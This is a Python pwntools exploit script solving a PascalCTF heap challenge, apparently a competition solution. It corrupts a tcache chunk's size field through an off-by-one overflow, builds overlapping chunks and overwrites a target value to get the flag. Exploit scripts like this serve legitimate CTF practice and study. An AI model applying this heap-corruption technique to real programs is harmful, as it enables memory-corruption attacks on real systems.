#!/usr/bin/env python3
"""
AHC - Average Heap Challenge Exploit

Technique: House of Kauri / Overlapping Chunks

The vulnerability is a heap buffer overflow when creating players.
The bug: read_name() returns strlen(name)+1 instead of strlen(name).

Key insight: Direct overflow from player 4 into target is 1 byte short.
Instead, we use player 3's overflow to corrupt player 4's SIZE field
while it's still in tcache, then create overlapping chunks.

Exploitation steps:
1. Create players 0,1,2 (consume tcache entries)
2. Create player 3 with overflow that corrupts chunk 4's size (0x51 -> 0x71)
3. Create player 4 (gets chunk with corrupted size field)
4. Delete player 4 (goes to tcache[0x70] instead of tcache[0x50])
5. Delete player 3 (free up index)
6. Create player 3 with extra=17 (malloc(89) -> 0x70 chunk, overlaps target)
7. Message now reaches target data field
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'

def solve(io):
    def create_player(idx, extra, name, message):
        io.sendlineafter(b'Exit', b'1')
        io.sendlineafter(b'at: ', str(idx).encode())
        io.sendlineafter(b'need? ', str(extra).encode())
        io.sendlineafter(b'name: ', name)
        io.sendlineafter(b'message: ', message)

    def delete_player(idx):
        io.sendlineafter(b'Exit', b'2')
        io.sendlineafter(b'from: ', str(idx).encode())

    def check_target():
        io.sendlineafter(b'Exit', b'5')

    # Step 1: Create players 0, 1, 2 (consume tcache entries)
    log.info("Step 1: Creating players 0, 1, 2...")
    for i in range(3):
        create_player(i, 0, b'A', b'B')

    # Step 2: Create player 3 with size corruption payload
    # Player 3 buffer at heap+0x100, buffer[72] = heap+0x148 = chunk 4's size field
    # Corrupt chunk 4's size from 0x51 to 0x71 (still valid tcache size)
    log.info("Step 2: Creating player 3 with size corruption...")
    name3 = b'A' * 39  # message_offset = max(40, 32) = 40
    message3 = b'X' * 32 + b'q'  # 'q' = 0x71, corrupts chunk 4's size
    create_player(3, 0, name3, message3)

    # Step 3: Create player 4 (gets chunk with corrupted size field)
    log.info("Step 3: Creating player 4...")
    create_player(4, 0, b'A', b'B')

    # Step 4: Delete player 4 (goes to tcache[0x70] instead of tcache[0x50])
    log.info("Step 4: Deleting player 4 (goes to wrong tcache bin)...")
    delete_player(4)

    # Step 5: Delete player 3 (free up index for reuse)
    log.info("Step 5: Deleting player 3...")
    delete_player(3)

    # Step 6: Create player 3 with extra=17 (malloc(89) -> 0x70 chunk)
    # This retrieves chunk 4 from tcache[0x70], but treats it as 0x70 bytes
    # Creating overlap: buffer now extends to cover target's data field
    #
    # With extra=17: malloc(17 + 0x48) = malloc(89) -> 0x70 chunk
    # message_offset = max(40, 17+32) = max(40, 49) = 49
    # Message at buffer[49:88], buffer[80:88] = target data field
    log.info("Step 6: Creating player 3 with overlapping chunk...")
    name6 = b'A' * 39
    target_value = p64(0xdeadbeefcafebabe)
    # message[31:39] -> buffer[80:88] = target data
    message6 = b'X' * 31 + target_value[:8]
    create_player(3, 17, name6, message6)

    # Step 7: Check target
    log.info("Step 7: Checking target value...")
    check_target()

    io.recvuntil(b'Target', timeout=3)
    response = io.recvline()
    log.info(f"Response: {response}")

    if b'not matched' not in response:
        log.success("FLAG FOUND!")
        remaining = io.recvall(timeout=5)
        print(remaining.decode(errors='ignore'))
    else:
        log.warning("Check failed")

if __name__ == '__main__':
    if args.REMOTE:
        io = remote('ahc.ctf.pascalctf.it', 9003)
    else:
        io = process(['./orig/ld-linux-x86-64.so.2', '--library-path', './orig', './orig/average'],
                     env={'FLAG': 'PascalCTF{test_flag}'})

    solve(io)
    io.close()
